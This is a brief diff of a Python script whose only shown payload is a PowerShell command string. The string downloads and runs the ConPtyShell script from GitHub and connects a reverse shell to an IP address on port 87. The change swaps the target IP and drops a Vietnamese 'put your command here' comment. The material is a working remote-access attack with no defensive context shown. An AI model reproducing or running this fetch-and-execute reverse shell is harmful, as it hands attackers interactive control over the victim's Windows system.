@@ -1,7 +1,7 @@
 import subprocess
 
 #powershell command to execute
-COMMAND = "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.118.116.130 87"  # <-- Thay lệnh của bạn vào đây
+COMMAND = "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.116.130 87" 
  
  
 def run_powershell(command: str):
